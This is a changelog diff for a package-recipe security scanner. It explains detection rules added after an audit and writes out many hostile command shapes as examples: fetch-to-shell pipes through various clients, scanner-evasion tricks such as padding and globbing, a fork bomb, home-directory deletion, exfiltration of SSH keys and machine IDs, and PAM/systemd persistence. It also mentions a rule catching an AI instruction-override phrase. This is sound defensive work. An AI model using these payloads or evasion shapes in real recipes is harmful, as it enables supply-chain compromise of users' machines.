@@ -219,6 +219,1247 @@
 
 ### Security
 
+- **Four vocabularies were allowlists, and each was one rename wide.** An
+  external audit ran twenty-three passes against this tree; the findings
+  collapsed into a small number of root causes, and the fixes below are those
+  causes rather than the individual spellings.
+
+  *The executor list.* `curl url | php` is a remote shell as surely as
+  `curl url | bash`, and php, lua, tclsh, fish, tcsh, csh, rc, es, elvish,
+  xonsh and nu all execute standard input given no script argument. All now
+  score 65/High where they scored 30. `awk` is deliberately absent: awk reads
+  its program from an argument and its stdin is data.
+
+  *The execution-verb forms.* A flag or a wrapper is not a different
+  operation, but `bash -x s.sh`, `env bash s.sh`, `nohup`, `timeout 5`,
+  `busybox sh`, `node s.sh`, `/usr/bin/bash s.sh` and a bare `"$srcdir/s.sh"`
+  each produced no execution at all, so the write on the previous line paired
+  with nothing. `env -i bash` was caught while plain `env bash` was not, which
+  is the asymmetry that gives it away: the pattern was reading the verb's
+  position rather than what runs.
+
+  *The write forms.* `tee` names its destination as an argument - that is its
+  purpose - and only the redirect spelling was read. `make > s.sh`,
+  `gzip -dc p.gz > s.sh`, `perl -e 'open(F,">s.sh")'` and
+  `python3 -c "open('s.sh','w')..."` were all invisible, and `dd of=X if=Y`
+  failed for a third reason: the destination was read as the last token on
+  the line.
+
+  *The fetch-client list.* See X009 below.
+
+- **Five new crossfire rules, for the shapes a longer list cannot express.**
+  X001-X008 match *techniques*; these match the point where an inventory ran
+  out.
+
+    - **X009 (CRITICAL)** - a fetch reaching a shell through a client other
+      than curl/wget. `lftp -c "cat URL" | bash`, `nc host 80 | bash`,
+      `scp host:/x - | bash`, `openssl s_client -connect h:443 | bash`,
+      `dig +short TXT d | sh` and `aria2c -o - URL | bash` produced nothing;
+      several scored **zero with no coverage gap**, a silent clean verdict on
+      a working remote code execution. The client vocabulary now lives in one
+      place and is shared with R061, R137 and R051.
+    - **X010 (HIGH)** - an interpreter one-liner that reaches the network.
+      `php -r 'system(file_get_contents(URL));'` needs no shell client, so
+      R061's inventory never saw it.
+    - **X011 (HIGH)** - a package manager fetching and running third-party
+      code at build time: `pip install git+https://`, `npm install <url>`,
+      `cargo install --git`, `go install m@latest`, and the one-shot runners
+      `npx`/`bunx`/`uv run`/`pipx run`. It stands down on the spellings that
+      answer its own question - `npm install --ignore-scripts` turns off the
+      hooks, `pip install --no-deps .` installs what this recipe just built -
+      because both benign-corpus hits carried their disqualifier on the line.
+    - **X012 (HIGH)** - `CC`, `PATH`, `LD_PRELOAD` and friends pointed into
+      `$srcdir` ahead of a compile step. The override fetches nothing and
+      executes nothing a reader can see; what it does is decide which binary
+      the *next* line runs.
+    - **X013 (HIGH)** - a proxy, DNS override, host remap or replaced CA. A
+      URL in `source=()` says where the bytes come from and a reader checks
+      the host; `--resolve`, `--connect-to`, `--doh-url`, `--cacert`,
+      `SSL_CERT_FILE` and `CURL_CA_BUNDLE` override that answer afterwards.
+      R057 owns `-k` - turning verification off; this is the other half.
+
+  All five fire on **zero** of the 3,246 diffs in the locked benign corpus,
+  and the flag rate is unchanged at 377 (11.614%).
+
+- **The last of the audit's silent rows.** Replaying the probe corpus after
+  these changes leaves 81 of 687 rows silent, of which 72 are the audit's
+  own benign controls - `make`, `true`, `_size=999` - which must stay at
+  zero. Nine carry a payload, and each is a stated boundary rather than an
+  oversight: the 5 MiB byte cap, a secret lookup that exfiltrates rather
+  than executes, a `submodule.update` value git itself rejects, and configs
+  written into the build tree whose tool never names the file.
+
+  Closed on the way: `ttyd` and `zellij` as exec wrappers, `xargs` as a
+  wrapper *inside* a pipeline (its `-I{}` flags carry braces the general
+  wrapper pattern does not allow), Perl's `open2`/`open3`, a flag whose
+  value is a script in the build tree, and a quoted value that is itself a
+  pipeline into a shell (`mutt -e "push \"|bash\""`, whose quotes are
+  backslash-escaped because the value nests inside another argument).
+
+- **Docs: navigation and reference tone.** The fifteen rule category pages
+  were declared under a `project.nav.rules` table with no `rules` parent, so
+  none of them rendered in the navigation - the rule list was reachable only
+  by following a link from the index. Rules is now its own top-level
+  section with all seventeen pages, and the nav uses the same
+  array-of-tables form throughout.
+
+  The crossfire and unverifiable pages were rewritten as reference rather
+  than narrative. They had grown to argue *why* each rule was written -
+  which version was wrong, what fired on how many benign packages - and
+  that is changelog material. A reference page states what a rule matches,
+  shows a fires/quiet table, and links to the rules it defers to. The
+  provenance stays here, where it belongs.
+
+  The index generator learned the W series and the new entry format; it had
+  been silently skipping six rules. It now also writes a **Rules on this
+  page** table into each of the fifteen category pages: those pages were a
+  flat run of `###` sections with no `##` above them, so a reader looking
+  for one rule got a single unstructured table of contents and had to
+  scroll.
+
+  A full pass over all 58 pages fixed the rest: two orphan pages
+  (`license.md`, `contributing/blinded-evaluation.md`) reachable only by
+  URL, seven pages carrying more than one `# ` heading, and the last of the
+  provenance narrative on the R147 and R149 entries.
+
+- **The audit's own probe corpus, replayed.** The reports ship the scripts
+  that produced them - 199 probes, 2,907 rows, each with the score recorded
+  at the time. Replaying all of them against this tree turned a sampled
+  claim into a measured one: of 687 rows that scored zero when the audit
+  ran, 555 now score or fire a technique rule. What follows is what the
+  replay found that sampling had missed.
+
+- **`ssh` was never a fetch client.** It read as covered because the
+  audit's probe used `host` as the hostname, which collides with the `host`
+  DNS client - the chain fired for the wrong reason, and any other hostname
+  scored nothing. Anchored on a remote command, since neither `ssh` nor
+  `scp` appears anywhere in the benign corpus.
+
+- **A filter between the fetch and the shell.** X009 wanted the shell
+  immediately after the pipe, so `dig +short txt e | head -c 2000 | bash`
+  hid the whole chain. R001 and R002 read past intervening stages for curl
+  and wget; the rule written to cover the remainder did not. Both arms now
+  ask about the *end* of the pipeline.
+
+- **A trailing `|| true` hid the pipe before it.** The pipeline reader
+  treated `||` as voiding the line rather than ending the pipeline, and
+  `| bash || true` - how nearly every probe spells the shape, so a failing
+  payload does not fail the build - discarded the pipe entirely.
+
+- **X022: a generated config handed to the tool that reads it.** The
+  largest silent family in the audit. R145 and R149 claim a config that is
+  *shipped*; this one stays in the build tree, where naming `$srcdir` is
+  perfectly normal, and is never installed anywhere. What makes it
+  execution is the second line - `printf "dhcp-script=$PWD/x.sh" >
+  "$srcdir"/d` then `dnsmasq --conf-file="$srcdir"/d`. The pairing is the
+  observable: writing a config is ordinary and passing a filename to a
+  program is ordinary.
+
+- **X023: command output executed as a script.** `pass otp e | bash`,
+  `cat /sys/kernel/tracing/trace | bash`. The bytes are produced locally so
+  no fetch rule has anything to say. No package in the benign corpus pipes
+  anything at all into a shell.
+
+- **Padding with comments pushed the payload past the line cap.** The twin
+  of padding a single line with spaces, and it survived that fix: 20,000
+  `# c` lines pushed a `curl … | bash` past `MAX_SCANNED_LINES`. Comments
+  and blanks are still emitted - dropping them would renumber every line
+  after them, and the line number is evidence - but they no longer count
+  against the limit.
+
+- **git's exec-bearing config keys.** `core.fsmonitor`, `diff.external`,
+  `filter.*.clean`, `credential.helper` and the rest name programs git
+  runs, and `git -c key=cmd` sets one without looking like a command. A
+  bounded list, because git publishes it - and narrowed to git's own
+  semantics: `submodule.<n>.update` takes `checkout|rebase|merge|none|
+  !command` and an alias is a git subcommand unless prefixed with `!`, so
+  disabling a submodule stays quiet as it does twice in the corpus.
+
+- **X021: the executor is literal and the file it runs is not.** X002 asks
+  whether the *command* can be read from the text; this asks the same of
+  its argument, which was the open half. `set -- *.sh; bash "$1"`,
+  `mapfile -t A < <(ls *.sh); bash "${A[0]}"`, `IFS=:; bash $*` - `bash` is
+  perfectly literal in every one, so X002 stands down and every
+  path-pairing rule looks for a filename that is not there. An executor
+  whose file argument is a positional parameter, an array element or a glob
+  appears in no package in the benign corpus; recipes name the file they
+  mean.
+
+- **R151: boot or image material built from the source tree.** `dracut
+  --include "$srcdir/x"` injects a build-tree path into the initramfs,
+  which runs before userspace exists and before any filesystem the user can
+  inspect is mounted. Shipping a kernel module is `install`; *generating*
+  boot material during a build captures the builder's machine.
+
+- **A content address is still an address.** `magnet:` names bytes rather
+  than a host and carries no `://`, and the address matcher finds addresses
+  by that marker - so the client was recognised and the fetch scored
+  nothing, because nothing could be attributed to it.
+
+- **A sandbox root makes an absolute path tree content.** `chroot
+  "$srcdir/root" /bin/sh /x.sh` ran an unread script and matched nothing:
+  W001 wanted a bare executor word, not `/bin/sh`, and treated the leading
+  slash of `/x.sh` as marking a system file.
+
+- **W005: a build target whose recipe was not read.** The third of the
+  manifest trio - X020 claims the recipe *writing* the steps, W004 the
+  recipe naming a manifest *file*, and this one the recipe naming a
+  *target* inside a manifest it did not name: the implicit `Makefile` that
+  came with the archive. `make install` is a contract every build system
+  honours; `make dist-hooks` names a recipe that exists only in this
+  project's Makefile.
+
+  This rule exists because a measurement contradicted an assumption. The
+  shape was dismissed as near-universal - "every package runs make" - and
+  measured, a *non-standard* target turns out to appear in 0.3% of the
+  benign corpus. The assumption was wrong.
+
+- **A fork bomb written without a pipe.** S001 required the `name|name`
+  spelling, so `boom(){ boom & boom & }` - the same bomb joined by `&`
+  instead of a pipeline - read as clean. The essential property is that the
+  body reaches its own name more than once and backgrounds, not which
+  operator joins the calls. Recursion without backgrounding terminates,
+  backgrounding without recursion is one job, and a name inside an `echo`
+  is a string; all three stay quiet.
+
+- **R150: an unread script executed during packaging.** The scoring half
+  of W001, and the split is measured rather than assumed. `package()`
+  stages files into `$pkgdir`; it is not where software gets built, and its
+  output *is* the package. Of the three benign corpus diffs that execute a
+  script from the unpacked tree, two are in `build()` and one in
+  `prepare()` - none is in `package()`. So W001 keeps weight 0 over the
+  surface where the behaviour is ordinary, and the subset that is not
+  ordinary is scored. The W contract is unchanged: a W finding never
+  carries weight, so a surface that deserves weight becomes a different
+  rule rather than a heavier W.
+
+- **X020: the recipe writes the build steps the engine runs.** A build
+  system reads its steps from a manifest, and normally that manifest is
+  upstream's or generated by cmake from upstream's. When the *recipe*
+  writes one, the commands in it are the packager's - and they are data
+  until the engine runs them, so no execution rule reads a `command =`
+  line. `cat > build.ninja` with `command = bash $srcdir/x.sh` inside puts
+  an execution one indirection away from every rule that looks for one, and
+  the invocation that follows is a bare `ninja -C build` nobody looks at
+  twice.
+
+  It claims authoring, not transforming: `sed -e … Makefile > dest`
+  rewrites steps that came from upstream, which is how a DKMS package
+  substitutes a kernel version and was this rule's only benign fire before
+  the distinction was drawn.
+
+- **W004: a build engine pointed at a manifest nobody read.** X020's
+  counterpart. Anchored on an *explicit* `-f`/`--file` argument, because a
+  bare `make` also runs a manifest nobody read and that is most of the
+  ecosystem. Naming a particular file is a choice, and the choice is the
+  observable. A declared manifest stays R138's, where the bytes are at
+  least checksum-pinned.
+
+- **R149: a committed config pointing at a build-only path.** The
+  symmetric half of R145. That rule reads content the recipe *generates*
+  into `$pkgdir`; this one reads content the recipe *committed* and then
+  ships. Same observable - `$srcdir`, `$startdir`, `$PWD` exist only while
+  the package is built, so a shipped file naming one is either broken on
+  arrival or aimed at a directory whoever wrote it expects to control when
+  it is read - and the value has to sit in a directive that runs
+  something, because a `Comment=` mentioning a build path is a cosmetic
+  mistake and an `Exec=` naming one is a command pointed at nothing.
+
+  **The key list went the same way the executor list did.** The first
+  version asked "is this an exec directive" and carried a short catalogue
+  to answer it, on the reasoning that it only had to be good enough.
+  Measured against thirty verticals from the audit, it cost twelve:
+  `System(...)` in an Asterisk dialplan, `binary=` in an rsyslog action,
+  `load_module` in nginx, `NOTIFYCMD` in upsmon, `DisplayCommand` in sddm,
+  `HOOKS=()` in mkinitcpio, a bare `source` in a shell rc, a mailcap entry
+  with no key at all. A short list was not a smaller version of the
+  problem; it was the same problem.
+
+  So the question is inverted. A shipped file that names a build directory
+  is broken on arrival whatever field holds the path. What genuinely does
+  not matter is a field that only *describes* - `Comment`, `Description`,
+  `Name`, `Icon`, `URL`, `X-*`, a comment line - and those are few and
+  stable. All thirty verticals now fire; 249 committed files across 81 real
+  AUR repositories produce nothing.
+
+  This closes the config-carried-exec family an audit raised across 70
+  reports. Six of its ten worked examples already scored 50-75 (writes to
+  absolute system paths trip R058/R128/R054, and generated `$pkgdir`
+  content trips R145); the four that did not were all the same shape, a
+  directive in a *committed* file. That is one rule, not the 34
+  host-specific ones proposed - `dhcp-script`, `omprog`, `exec_dset`,
+  `FoomaticRIPCommand` and so on are an unbounded list, and the attacker
+  picks the next daemon.
+
+  The proposed design also tested "does this value reference a fetched
+  artifact" by accepting any path ending in `.sh`, `.py` or `.js`, which
+  makes `ExecStart=/usr/share/p/launcher.sh` - the most ordinary line a
+  packaged unit can contain - a CRITICAL finding. Its own negative example
+  passed only because `firefox` has no file extension. Anchoring on the
+  build-only path is what keeps that quiet.
+
+- **A new series: W, for what could not be checked.** Every other rule says
+  "this recipe does something". A W finding says "this analysis could not
+  check something", attached to the line it applies to - the same act as a
+  coverage gap, moved from the run to the line.
+
+  It exists because the alternative to pricing a common behaviour is not
+  pricing it *less*, it is saying nothing at all. The largest such surface
+  is a recipe that unpacks a declared, checksummed archive and runs a script
+  from inside it. The checksum proves the bytes arrived unaltered and says
+  nothing about what they do, and this analysis never reads them. Weighting
+  that would put a finding on a large share of the ecosystem and make the
+  number mean less, which is exactly what B10 forbids. Silence was the other
+  option, and silence is what the boundary documentation had to describe as
+  something TrustSight cannot see.
+
+  It can see it. It must not price it. So **W001** says so and scores
+  nothing - and is shown anyway, unlike every other weight-0 non-critical
+  finding, because a statement whose only value is to a reader is worthless
+  if filtered.
+
+  The pattern is deliberately its own rather than shared with R138. R138's
+  capture is allowed to be loose: a token that is not a path cannot equal a
+  declared basename, so `python3 -m build` capturing `-m` costs that rule
+  nothing. A rule that *prints* the path has no such luxury - reusing the
+  loose capture produced evidence like `log\.txt|/var/log/ventoy.log|g`
+  from inside a `sed` script, the MIME type in
+  `x-scheme-handler/orcaslicer`, and the `usr/bin/env` of a shebang. Two
+  shapes qualify and no third: an interpreter naming a file, and a `./`
+  invocation. 3 of 3,246 benign diffs (0.09%), each a genuine case.
+
+  Two more members followed the same contract. **W002** reports a build
+  step that resolves from a language registry - `npm install`, `pip install
+  -r`, `cargo fetch` - where the recipe names a *set* of packages and a
+  registry decides which bytes satisfy it, at build time, after review.
+  That is already the `unpinned_build_deps` coverage gap; what a gap cannot
+  say is *where*, which is the difference between a property of the
+  analysis and a property of the recipe. **W003** reports a `patch` or
+  `git apply` naming bytes that are not in this repository: a committed
+  patch is one R146 reads, and a declared remote one sits behind a checksum
+  this tool never downloads. A tarball is upstream's own code; a patch is a
+  change to it that the *packager* chose, which makes it more interesting
+  to a reader, not less - and still unreadable here.
+
+  W003 is the highest-firing member at 2.06% of the benign corpus, and that
+  is the correct answer rather than a tuning problem: applying a patch whose
+  bytes are not in the repository is both common and genuinely unread.
+
+  Fixing that capture also tightened R138: its `./x` arm was never anchored
+  to a command position, so it matched the `./` inside `sed 's|./log…'` and
+  inside `../x.patch`.
+
+- **A named `.install` hook the tree read did not include.** An `.install`
+  scriptlet runs as root on the installing machine, and the recipe *names*
+  it rather than containing it. Once a tree had been read the absence of
+  `tree_not_analyzed` said the committed files were examined - but a
+  manifest that does not hold the named hook means the one file whose whole
+  purpose is to run as root was never examined, and the report claimed the
+  tree was complete.
+
+- **A stale ruleset degrades the verdict instead of passing quietly.**
+  `rules.toml` is written once, at install time, and never rewritten, so a
+  user who never hand-edits rules runs whatever the defaults were on the
+  day the tool first ran. `sync-rules` *reports* the divergence but refuses
+  to adopt shipped patterns, because it cannot tell a stale rule from a
+  customised one except through a hand-maintained list of superseded
+  patterns.
+
+  That refusal is defensible - overwriting a user's edits would be worse.
+  Doing it silently is not: a run against a drifted ruleset has a detection
+  surface that is not the one this version documents, and B2 says an
+  analysis that could not do what it claims must say so. It now raises a
+  `ruleset_drifted` coverage gap. This one bit the audit itself twice, when
+  triage passes measured against a stale local file and reported rules as
+  broken that had shipped fixed.
+
+- **R148: the metadata and the recipe describe different packages.**
+  `.SRCINFO` is generated *from* the PKGBUILD, and the analysis prefers it
+  wherever it is richer - structured `depends`, expanded sources. Nothing
+  compared the two, so a `.SRCINFO` naming a source the recipe does not was
+  believed, and an AUR helper resolving dependencies from metadata while
+  makepkg builds from the recipe read two different descriptions of one
+  package. Compared by *host*, because a PKGBUILD writes
+  `source=("$url/archive/v$pkgver.tar.gz")` and the metadata carries the
+  expansion; no package among 50 real AUR repositories has a `.SRCINFO`
+  host its PKGBUILD does not also name.
+
+- **One host, one spelling.** Case, the root-label dot, the default port
+  and userinfo each name the same machine, and every subsystem normalised a
+  different subset. `classify_url` lowercased the host for one check and
+  handed the *raw* URL to the suffix extractor for the next, so
+  `https://GITHUB.com/...` classified as `unknown` while the lowercase form
+  classified as `trusted_forge`. Novelty had the mirror: five spellings of
+  one resource were five first-seen events.
+
+- **One maintainer, one identity.** `Alice`, `alice`, Cyrillic `аlice` and
+  a zero-width-split `ali<ZWSP>ce` hashed to four identities and read as one
+  person. Rotating the spelling split the longitudinal history, so an
+  account could stay permanently new - stability priors and the observation
+  floor never accumulate against an identity that is different every time.
+  Every folding step is a no-op on a plain ASCII name, because this is the
+  chokepoint the shipped seed corpus was hashed through.
+
+- **R012 stopped guessing the noun.** The rule matched an ignore-verb, a
+  backward reference and then one of eight enumerated nouns, so
+  "disregard all earlier **directions**" passed. Measured against the
+  corpus, the verb plus the backward reference appears in *zero* benign
+  lines - the noun list was doing no work against false positives and only
+  limited what the rule could see. It is gone.
+
+- **R147: a checksum array shorter than its source array.** makepkg pairs
+  them by position and no rule looked at the two lengths together, so a
+  source slipped in beside a checksum list nobody recounted scored nothing
+  but priors. Two things had to be right first: a diff shows a hunk, not a
+  file, so an array that continues into unchanged lines is only partly
+  visible (counting the visible part fired on 26 benign packages); and
+  `name::url` is makepkg's rename form and is *one* source, which a token
+  regex read as two.
+
+  Checksum arrays are also read resolved now: `_cs=SKIP` above
+  `sha256sums=("${_cs}")` reported that a checksum had been set.
+
+- **X018: an interpreter one-liner that assembles the name it calls.**
+  X010 and R044 look for a module name inside a `-c` script, and a keyword
+  list in a language with string concatenation is a suggestion - one `+`
+  in `importlib.import_module("url"+"lib.request")` defeated all three
+  rules at once. The rule looks for the assembly instead: reflection
+  primitives and glued-together name literals.
+
+- **X019: host material sent or packaged.** A DNS query whose name is
+  computed, or an ICMP payload that is a hex dump, carries data out in a
+  field nobody reads as a channel. The other half sends nothing at build
+  time: `env`, `/etc/machine-id`, `~/.ssh` and shell history written into
+  `$pkgdir` exfiltrate later, when the package is published.
+  `install -D /etc/machine-id` tripped R058; `cat` reading the same file
+  into the same place was silent.
+
+- **Three fetch clients and a way out.** libwww-perl's CLI
+  (`lwp-request`, `lwp-download`) and BSD `fetch(1)` were uncatalogued.
+  So was `git push`: the inventory had clone, fetch and pull - every way
+  to bring code in and no way to send it.
+
+- **R089 could not see the families built to evade it.** Its stage map was
+  written when the R-series was the whole ruleset, so a diff carrying
+  nothing but evasion, or nothing but sabotage, could not reach the stage
+  count however many rules fired. The X- and S-families are mapped now,
+  and R089 itself is shown: it says the diff holds a staged attack chain,
+  which changes how every other finding should be read, and it was
+  computed and then dropped before anyone saw it.
+
+- **A machine consumer can tell clean from unread.** `flagged: false` is
+  not "this package is fine", it is "the score this run produced did not
+  reach the threshold" - and when coverage is incomplete that score came
+  from a partial read. The JSON body now carries `fully_vetted`.
+
+  Relatedly, a dependency the diff *adds* and the run did not analyse now
+  raises `deps_not_scanned`. Dependency findings still never move the
+  parent's score, which is right; what changes is that the report stops
+  claiming a complete analysis of a change it only half read.
+
+- **Padding a line past the clamp no longer blinds every rule at once.**
+  Rules match against lines truncated to `MAX_RULE_LINE_BYTES`. Pad a
+  `curl … | bash` with leading whitespace so the command starts past the
+  ceiling and *every* pattern rule went blind together - R001, R010, the
+  whole X-family - leaving only the `line_truncated` gap, which carries no
+  weight.
+
+  The clamp is not the defect. It bounds matching cost on attacker-chosen
+  input, which is why it cannot be raised or replaced with sliding windows:
+  the cost is the attacker's to choose and bounding the input bounds every
+  pattern at once. What was wrong is that it measured *bytes*, and 8192
+  leading spaces are 8192 bytes of nothing. A shell ignores leading and
+  repeated whitespace, so collapsing it before measuring changes what no
+  line means, costs one linear pass, and spends the budget on content.
+  Padding must now be made of real tokens, which a reader can see.
+
+- **Thirteen persistence paths R054 named but could not match.**
+  `/etc/ld.so.preload`, `tmpfiles.d`, `sysusers.d`, `polkit-1/rules.d`,
+  `/etc/profile`, `/etc/bash.bashrc`, systemd `system-generators`,
+  `/etc/rc.local`, `update-motd.d`, `/etc/skel`, `/etc/environment`,
+  `sysctl.d` and `binfmt.d` all staged into the package root for nothing.
+
+  `/etc/rc.local` is the instructive one: it was already *in* the rule,
+  inside a group the pattern follows with a `/`. A directory needs that
+  slash and a file must not have one, so the rule listed a path it could
+  never match. The list is now split by that distinction. Each addition was
+  measured on its own against the benign corpus and each was at zero;
+  `udev/rules.d`, `modprobe.d` and `apparmor.d` stay out for the reason
+  already recorded - driver and library packages ship them as a matter of
+  course.
+
+- **Four ways to ask for root.** R009 named `sudo`. `doas`, `pkexec` and
+  `run0` do the same thing, and naming only the first tested which tool the
+  writer preferred rather than what it does. `setcap cap_setuid+ep` grants
+  what the setuid bit grants by a different mechanism, and R053/R059 both
+  keyed on `chmod` - a capability is not a mode, so it fired nothing.
+
+- **A variable defeated every sabotage rule at once.** The S-family read
+  literal text, so `dd of="$D"`, `systemctl stop "$U"` and `rm -rf "$T"`
+  each evaded the rule written for it. The name is the attacker's to choose
+  and the value is right there in the diff; the fetch and delivery rules
+  resolve for exactly this reason. They now read resolved lines.
+
+  S002 had a second, sharper version of the same problem: its build-tree
+  stand-down tested the *whole line*, so `rm -rf "$srcdir/.git" ~` cleared
+  a build directory and the operator's home in one command and the first
+  silenced the second. One `$srcdir` token was a licence to delete anything
+  standing next to it. The stand-down is now per-argument.
+
+- **An override above an unchanged build step.** X012 read added lines
+  only - right for asking what a diff introduced, wrong for asking what an
+  override redirects. `export CC="$srcdir/mcc"` added directly above an
+  unchanged `make` is the shape where the attacker supplies one line and
+  the existing recipe supplies the rest, and it was the one shape the rule
+  could not see. It also required a `/` after `$srcdir`, so
+  `PATH="$srcdir:$PATH"` - the plainest spelling of the plainest case -
+  matched nothing.
+
+- **A glob in command position.** `/usr/bin/c?rl -s URL | bash` runs curl;
+  the word in the diff is not the name of any program, and what runs is
+  whatever the glob finds on disk. Every other X002 shape answers "the
+  reader cannot tell what runs from the text" and a glob answers it the
+  same way - it was simply not on the list. R041 gained the same treatment
+  for `/dev/t?p/`, where bash expands the glob when the redirect runs.
+
+- **X017: a command where a command is not expected.** Every rule that
+  reads execution reads a command. `--checkpoint-action=exec=`,
+  `--to-command=`, `find -exec sh {}`, `enable -f` and `hash -p` put it in
+  a flag value or a builtin's argument, so the line reads as archive
+  extraction, a file search, or shell configuration. `find -exec` is
+  narrowed to an executor because the ordinary use is this rule's opposite.
+
+- **R138 gained the three arms R137 already had.** The pair ask the same
+  question of a fetched file and a declared one, and only R137 could see
+  `sh < "$srcdir/setup.sh"`, a bare `"$srcdir/setup.sh"` in command
+  position, or `make -f` on a downloaded makefile.
+
+- **Two API-boundary fixes.** `analyze_text` never type-checked its
+  timestamps, so passing a date string - the obvious mistake - raised a
+  `TypeError` from inside the temporal rules instead of naming the argument
+  that was wrong. And a maintainer name reached `Report` carrying whatever
+  terminal escape it was given: the CLI renderer cleans what it prints, but
+  the fix belongs where the fact becomes a report, not in one of the things
+  that reads it.
+
+- **R146: a committed companion that fetches and runs code.** A `.service`
+  whose `ExecStart=` pipes a download into a shell is the payload, and
+  nothing read it. The diff showed the recipe staging the file - ordinary
+  packaging, scored as such - while the bytes that matter lived in a file
+  the diff does not touch.
+
+  That split is available to an attacker as a schedule: commit the unit in
+  one push, where it is a file nobody runs, and add the `install` line in a
+  later one, where the reviewer sees a single unremarkable line. Neither
+  push contains an attack. Both together do.
+
+  Reading the content at all required a change underneath it. The tree
+  manifest kept 64 bytes per file, which answers "is this an ELF" - all
+  R118 ever asked - and cannot answer "what does this unit run". Files whose
+  names say a recipe can ship or apply them are now read to 16 KiB, with a
+  512 KiB ceiling across the tree, and a companion cut short by either bound
+  marks the tree incomplete rather than reporting a full examination of a
+  partial read. A patch is read by its *added* lines: a hunk that removes a
+  `curl … | sh` is the opposite of this rule's subject.
+
+- **X016: a fetch piped into something the analyser cannot name.** R001
+  claims `curl … | bash` by naming the executor, and every executor it does
+  not name was a bypass: `deno`, `bun`, `pwsh`, `julia`, `Rscript`, `guile`,
+  `zx`, `escript`, `mruby` and `fennel` each ran the fetched bytes for an
+  undeclared-fetch HIGH and nothing more.
+
+  Adding those words would fix those words, and the attacker picks the next
+  one. So the list is inverted. The set of interpreters is unbounded and
+  chosen by the attacker; the set of things a recipe legitimately pipes a
+  download into is small and chosen by the ecosystem - an extractor, a
+  checksum, a text filter, a viewer. Those are enumerated, and anything else
+  at the end of a fetch pipeline is claimed: not because the word is known
+  to be an interpreter, but because it is *not known to be a consumer*. The
+  rule stands down on the executors R001 already claims, so one pipeline
+  produces one claim. Zero occurrences in the benign corpus.
+
+- **R145: a packaged file naming a build-only path.** The largest silent
+  family was a configuration file the recipe *generates* into the package
+  root whose exec slot names a script - an i3 `bindsym … exec`, a polybar
+  `exec =`, a udev `RUN+=`, an acme `RELOADCMD=`, a mutt `macro … !bash`.
+  Every rule that looks for execution reads the recipe's own commands, and
+  none of those lines is a command the recipe runs. They are text, and what
+  runs them is the user's session, later, on a different machine.
+
+  What separates them from the ordinary case is not the exec slot, which is
+  what those files are *for* - a `.desktop` with `Exec=/usr/bin/p` and a
+  `bindsym $mod+d exec dmenu_run` are exactly right and stay silent. It is
+  which path the slot names. `$srcdir`, `$startdir` and `$PWD` exist only
+  while the package is built, in a directory pacman never ships. A shipped
+  file naming one is either broken on arrival or aimed at a directory
+  whoever wrote it expects to control when it is read.
+
+  The rule is about the pairing of a write into `$pkgdir` with content
+  naming a build-only path, which is why it is not a line pattern:
+  `install -Dm755 "$srcdir/x" "$pkgdir/usr/bin/x"` names both on one line
+  and is the most common line in the ecosystem. There `$srcdir` is an
+  argument to a copy; here it is inside the bytes being written.
+
+- **R144: a packaged file pointing at a world-writable path.** A config
+  staged into the package root that names a program under `/tmp`,
+  `/var/tmp` or `/dev/shm`. Those directories are writable by everyone, so
+  whatever the config names can be replaced by any local user between the
+  package being installed and the config being read - and the config is read
+  as root for a unit, a PAM line or a cron entry.
+
+  It is both halves at once: an attacker shipping this is arranging for
+  their own planted file to run, and a maintainer shipping it by accident
+  has handed the same lever to anyone with a shell on the machine. The
+  target is never in the diff, which is why every rule that looks for a
+  payload found nothing - the observable is the *destination*. Zero
+  occurrences in the benign corpus; build-time use of `/tmp` as scratch
+  space needs both halves on one line and stays quiet.
+
+- **A heredoc body is content, not a shell assignment.** `cat >
+  "$pkgdir/…/e.service" <<EOF` with an `ExecStart=` payload inside was
+  folded away as an assignment and never matched - the same defect the
+  config-directive fix addressed for a unit file *shipped* whole, reappearing
+  for one *generated* by the recipe. Inside a heredoc the text is content
+  whatever the enclosing file is, so the distinction now applies to a region
+  as well as to a file.
+
+- **A value pulled out of a data file and handed to a shell.** `jq -r .cmd
+  cfg.json | bash` is the same shape as X001's decoder arms with a *query*
+  in place of an algorithm: the field lives in a JSON file no rule reads, so
+  what executes is chosen by the data rather than written in the recipe, and
+  a reviewer sees a config lookup. `yq`, `tomlq`, `xmlstarlet sel`,
+  `xmllint --xpath`, `sqlite3 .read` and the `json.load`/`JSON.parse`
+  interpreter forms join the same arm. Reading a data file without running
+  the result stays quiet.
+
+- **A hook flag carries code like an environment variable does.** X014's
+  carrier is "a setting whose value is code", and a command-line flag is the
+  same carrier with a different spelling: `restic --option pre-exec=`,
+  `borg --pre-hook`, `rsync -e "ssh -o ProxyCommand=…"`. The tool runs the
+  value; the recipe only names it.
+
+- **`KEY=value` means two different things in two kinds of file.** In a
+  shell file the value goes into the variable table and is matched where it
+  is *used*, so folding the line away is right. In a systemd unit or a
+  `.desktop` file there is no later use - the value **is** the command - and
+  folding it away removed the line from matching altogether:
+  `ExecStart=/bin/sh -c "curl ... | bash"` produced no candidate at all, so
+  no resolved rule ever saw it.
+
+  That one root cause accounts for most of an audit family spanning seven
+  rounds - config-carried command values in systemd units, `.desktop` files,
+  rsyslog, syslog-ng, dnsmasq, xinetd, logrotate, NetworkManager dispatcher
+  scripts and cron entries. The fix is a file test, not fifty directive
+  names: outside a shell file, a `KEY=` line stays a candidate.
+
+- **Authentication and session hooks are persistence.** R054 gained
+  `pam.d`, `NetworkManager/dispatcher.d`, `xinetd.d`, `init.d`/`rc.d`,
+  `rc.local` and `logrotate.d`: a PAM line runs on every authentication, a
+  dispatcher script on every network change, an xinetd entry on every
+  connection. Each appears in zero of the 3,246 benign diffs - a package
+  that needs one ships it as a declared source file, which R054 reads either
+  way.
+
+- **A redirect makes a line a write, not a message.**
+  `echo "session optional pam_exec.so /opt/e.sh" >> "$pkgdir/etc/pam.d/…"`
+  was classified as something addressed to a reader, which is how a recipe
+  ordinarily appends to a system config. The first attempt searched the
+  whole line for `>` and put back a false positive this changelog already
+  records - `echo "==> sudo pacman -S qemu"` contains one as punctuation.
+  The check now looks only outside quotes, and is a scan rather than a
+  regex: the obvious pattern backtracks catastrophically with no redirect
+  present, at 942 ms on a full-length line.
+
+- **Tracking what cannot be read.** The upstream-payload gap is real: a
+  checksummed tarball's bytes are not in the diff, so a recipe can look
+  untouched while the code it builds is replaced. What *is* in the diff is
+  the carrier's **identity**, and a change to that under a stable version is
+  the observable form of the swap. R079 already applied that reading to a git
+  ref and C001 to a checksum; three carriers had no such claim.
+
+  `C008` (HIGH) claims a **submodule gitlink** or a **Git-LFS object id**
+  moving while `pkgver` does not - each names content the repository does not
+  contain, so moving one is a content change with no content in the diff.
